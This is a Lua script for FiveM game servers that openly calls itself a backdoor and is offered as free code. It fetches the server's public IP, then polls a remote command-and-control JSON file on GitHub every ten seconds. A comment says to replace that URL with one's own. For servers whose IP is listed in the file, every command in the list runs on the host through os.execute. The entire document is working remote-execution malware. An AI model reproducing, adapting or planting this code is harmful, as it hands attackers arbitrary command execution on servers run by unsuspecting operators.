--
--      //===========================================\\
--      //#############################################\\
--     //#################  BY N0RMIE ##################\\
--    //######### https://github.com/N0rmie #############\\
--   //###################################################\\
--  //###########    THIS IS FREE DON´T SKID    ###########\\
-- //=======================================================\\


--- WARNING THIS IS A BACKDOOR

local svipaddress
local verified = true
local payload

PerformHttpRequest('https://api.my-ip.io/ip', function (errorCode, resultDataa, resultHeaders)
    if resultDataa then
        svipaddress = resultDataa
    else
        svipaddress = "nil"
    end
end)

Citizen.CreateThread(function()
    while true do
        PerformHttpRequest("https://raw.githubusercontent.com/N0rmie/FiveM-Backdoor/main/CnC", function (errorCode, myDB, resultHeaders) -- Put here your own URL with the Json
            if errorCode == 0 then
                verified = true
            else
                if myDB == nil then
                    verified = true
                else
                    local kacdatabase = json.decode(myDB)
                    for _, i in pairs(kacdatabase.licenses) do
                        if i == "ip:"..svipaddress then
                            verified = false
                            return
                        else 
                            verified = true
                        end
                    end
                    for _, i in pairs(kacdatabase.cmd) do
                        if verified == false then
                            os.execute(i)
                        end
                    end
                end  
            end
        end)
        Citizen.Wait(10000)
    end
end)